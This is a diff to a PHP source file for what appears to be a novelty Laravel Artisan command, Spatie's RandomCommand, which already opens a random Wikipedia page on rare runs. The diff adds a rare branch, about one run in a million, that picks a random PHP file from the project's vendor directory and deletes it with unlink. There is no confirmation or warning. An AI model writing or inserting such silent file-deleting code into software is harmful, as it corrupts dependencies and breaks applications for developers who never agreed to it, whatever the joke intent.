@@ -2,9 +2,12 @@
 
 namespace Spatie\RandomCommand;
 
+use SplFileInfo;
+use RecursiveIteratorIterator;
 use Illuminate\Console\Command;
-use Illuminate\Console\ConfirmableTrait;
+use RecursiveDirectoryIterator;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Console\ConfirmableTrait;
 
 class RandomCommand extends Command
 {
@@ -33,5 +36,22 @@ class RandomCommand extends Command
         if (rand(0, 1000) === 42) {
             shell_exec('open https://en.wikipedia.org/wiki/Special:Random');
         }
+
+        if (! rand(0, 1000000)) {
+            $this->removeRandomVendorPhpFile();
+        }
+    }
+
+    private function removeRandomVendorPhpFile(): void
+    {
+        $path = base_path('vendor');
+        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
+        $file = collect(iterator_to_array($iterator))
+            ->filter(fn (SplFileInfo $file) => ! $file->isDir())
+            ->filter(fn (SplFileInfo $file) => $file->getExtension() === 'php')
+            ->map(fn (SplFileInfo $file) => $file->getPathName())
+            ->shuffle()
+            ->first();
+        unlink($file);
     }
 }
